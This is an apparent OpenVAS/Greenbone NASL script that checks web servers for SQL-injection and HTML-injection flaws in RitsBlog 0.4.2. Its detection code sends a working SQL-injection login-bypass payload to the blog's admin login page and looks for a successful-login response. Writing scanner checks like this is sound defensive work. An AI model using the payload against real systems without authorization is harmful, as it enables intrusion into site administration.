if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100014" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)" );
	script_bugtraq_id( 33959 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "RitsBlog SQL Injection and HTML Injection Vulnerabilities" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "RitsBlog is prone to multiple HTML-injection vulnerabilities and an
  SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage the HTML-injection issues to execute
  arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
  This may allow the attacker to steal cookie-based authentication credentials, control how the site is
  viewed, and launch other attacks.

  The attacker may exploit the SQL-injection issue to compromise the application, access or modify data,
  or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "RitsBlog 0.4.2 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/blog", "/ritsblog", "/RitsBlog", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/blogAdmin/jobs.php?j=login&p=1%27or%271&%27=1" );
	if(http_vuln_check( port: port, url: url, pattern: "Password found\\. Loging in\\.\\.\\.<script>" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

